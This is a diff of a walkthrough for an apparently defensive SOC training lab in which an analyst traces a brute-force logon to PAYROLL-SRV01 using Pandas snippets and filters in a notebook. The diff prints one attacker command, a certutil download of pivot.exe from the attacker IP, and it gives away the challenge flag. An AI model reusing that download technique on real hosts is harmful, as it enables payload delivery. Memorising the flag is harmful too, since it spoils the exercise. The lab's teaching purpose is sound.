@@ -23,79 +23,77 @@ At 03:14 UTC on September 10, 2026, the Security Operations Center (SOC) detecte
 
 ## 🎯 Investigation Methodology: Step-by-Step
 
-Follow these sequential steps in the interactive Marimo notebook or in your investigation environment:
+Follow these sequential steps in the interactive Marimo SIEM Console:
 
-### Step 1: Ingest & Scope the Raw Authentication Telemetry
+### Step 1: Alert Triage & Scope (Tab: `📋 Alert Triage & Scope`)
 
-1. **Open the Notebook**: In the Marimo workspace, observe the top KPI cards:
+1. **Review the Executive Alert**: In the first tab, inspect the incident context and target host profile (`PAYROLL-SRV01`, Windows Server 2022).
+2. **Review Top KPI Stat Cards**:
    - **Total Events Audited**: `1,073`
    - **Authentication Failures (Event ID 4625)**: `204+`
    - **Successful Logons (Event ID 4624)**: `800+`
    - **Distinct Source IPs**: `18`
-2. **Filter by Logon Status**:
-   - In **Step 1: Raw Security Event Log Telemetry**, select the `Logon Status:` dropdown and change it from `ALL` to `FAILURE`.
+
+---
+
+### Step 2: Telemetry Exploration & Data Export (Tab: `🔍 Telemetry Explorer`)
+
+1. **Filter by Logon Status**:
+   - Change `Logon Status:` from `ALL` to `FAILURE`.
    - Observe that `Event ID 4625` records populate the table, indicating failed logon attempts against various administrative accounts.
-3. **Filter by Target User**:
-   - In the `Target User:` search box, type `admin`.
-   - Notice multiple failures targeting `admin_backup`, `admin_db`, `admin_sys`, and `admin_finance`. This behavior matches automated password spraying or credential stuffing.
+2. **Filter by Target User**:
+   - In `Target User:`, type `admin`.
+   - Notice failures targeting `admin_backup`, `admin_db`, `admin_sys`, and `admin_finance`. This behavior matches automated password spraying or credential stuffing.
+3. **Export Evidence**:
+   - Click **📥 Export Filtered Telemetry (JSON)** to download the filtered dataset for external analysis.
 
 ---
 
-### Step 2: High-Frequency Failure Anomaly Triage
+### Step 3: Live Python Security Analytics (Tab: `💻 Analyst Python Scratchpad`)
 
-1. **Locate the Anomaly Pivot Table**: Scroll to **Step 2: High-Frequency Failure Anomaly Triage**.
-2. **Tune the Anomaly Threshold**:
-   - Set the `Min Failed Logons Threshold for Anomaly Detection` slider to `20`.
-3. **Analyze the Aggregated Pivot**:
-   - Notice the top entry in the pivot table:
-     - **Source IP**: `198.51.100.42` (External WAN IP)
-     - **Failed Attempts**: `204`
-     - **Targeted Users**: `['admin_backup', 'admin_db', 'admin_finance', 'admin_sys', 'administrator', 'svc_payroll']`
-     - **First Attempt**: `2026-09-10 01:12:05 UTC`
-     - **Last Attempt**: `2026-09-10 03:13:58 UTC`
-   - _Key Analyst Insight_: While internal IP addresses have 1–3 intermittent failures, `198.51.100.42` generated 204 sustained failures over a 2-hour window. This isolates `198.51.100.42` as the adversary's staging host.
+Real SOC analysts routinely write Python and Pandas snippets to slice telemetry. In the **Analyst Python Scratchpad** tab:
+1. **Execute Pre-Loaded Aggregation**:
+   - The embedded code editor runs live Pandas code against `df`. The default query aggregates failures by source IP:
+     ```python
+     failures = df[df['status'] == 'FAILURE']
+     top_failures = failures.groupby('source_ip').size().reset_index(name='fail_count')
+     top_failures.sort_values(by='fail_count', ascending=False).head(10)
+     ```
+   - Notice that `198.51.100.42` immediately surfaces with 204 failures!
+2. **Calculate the Compromise Time Delta**:
+   - Enter the following snippet in the editor to calculate the exact duration between the last failed attempt and successful logon:
+     ```python
+     succ = df[(df['source_ip']=='198.51.100.42') & (df['status']=='SUCCESS')]['timestamp'].min()
+     fail = df[(df['source_ip']=='198.51.100.42') & (df['status']=='FAILURE')]['timestamp'].max()
+     f"Transition Delay: {succ - fail}"
+     ```
+   - Output shows the breach occurred within 24 seconds of brute-force completion.
 
 ---
 
-### Step 3: Reconstruct the Chronological Attack Timeline
+### Step 4: Attack Timeline & LOLBin Forensics (Tab: `⚡ Attack Timeline & Pivot`)
 
-1. **Select the Anomalous IP in Step 3**:
-   - In **Step 3: Chronological Attack Timeline Analysis**, click the `Select Source IP to Trace Timeline:` dropdown and choose `198.51.100.42` (identified from the anomaly triage in Step 2).
+1. **Isolate Anomalous IP**:
+   - Adjust the `Min Failed Logons Threshold` slider to `20` to filter out background noise.
+   - Select `198.51.100.42` in the `Select Source IP to Trace Chronological Activity:` dropdown.
 2. **Identify the Breach Point**:
-   - Notice the prominent red breach alert banner that appears:
-     > 🚨 **BREACH DETECTED**: Source IP `198.51.100.42` obtained **1 successful logon(s)** after repeated failures!
+   - Observe the prominent red alert:
+     > 🚨 **BREACH CONFIRMED**: Source IP `198.51.100.42` achieved **1 successful logon(s)** after repeated failures!
      > - **Compromised Account**: `admin_finance`
      > - **Breach Timestamp**: `2026-09-10 03:14:22 UTC`
      > - **Logon Event ID**: `4624` (Logon Success)
-   - The adversary systematically rotated through user credential dictionaries until hitting valid credentials for `admin_finance`.
-   - **Authentication Package**: `NTLM`
-   - **Target Host**: `PAYROLL-SRV01`
-
----
-
-### Step 4: Process Execution & LOLBin Forensics
-
-1. **Scroll to Step 4 (Living-off-the-Land Tool Retrieval)**:
-   - After establishing an interactive session, the adversary spawned command shells under the `admin_finance` security context.
-2. **Review the Captured Process Cards**:
-   - **Card 1: Reconnaissance**:
-     - **Process**: `cmd.exe`
-     - **Command**: `whoami /all`
-     - **Purpose**: Verify privileges and group memberships (Account Reconnaissance - T1087).
-   - **Card 2: Ingress Tool Transfer (LOLBin)**:
-     - **Process**: `certutil.exe`
-     - **Timestamp**: `2026-09-10 03:15:07 UTC`
-     - **Command**:
+3. **Inspect Living-off-the-Land Tool Retrieval**:
+   - Scroll to the bottom of the tab to review the captured process cards:
+     - **Card 1 (`cmd.exe`)**: Reconnaissance (`whoami /all`).
+     - **Card 2 (`certutil.exe`)**: Ingress Tool Transfer (MITRE T1105):
        ```bat
        certutil -urlcache -split -f http://198.51.100.42/pivot.exe FLAG{brute_force_pivot_admin_2026}
        ```
-3. **Interpret the LOLBin Technique**:
-   - `certutil.exe` is a legitimate Windows utility designed for managing certificates. Adversaries abuse the `-urlcache -split -f` parameters to download malicious payloads directly over HTTP/HTTPS, bypassing default application controls and browser download restrictions.
    - The flag was passed as an embedded tracking argument in the command line: `FLAG{brute_force_pivot_admin_2026}`.
 
 ---
 
-### Step 5: Flag Verification & Submission
+### Step 5: Flag Verification & Submission (Tab: `🏁 Case Verification & IOCs`)
 
 1. **Verify the Flag in the Notebook**:
    - In **Step 5: Verify Incident Flag & IOC Report**, paste `FLAG{brute_force_pivot_admin_2026}` into the text box.
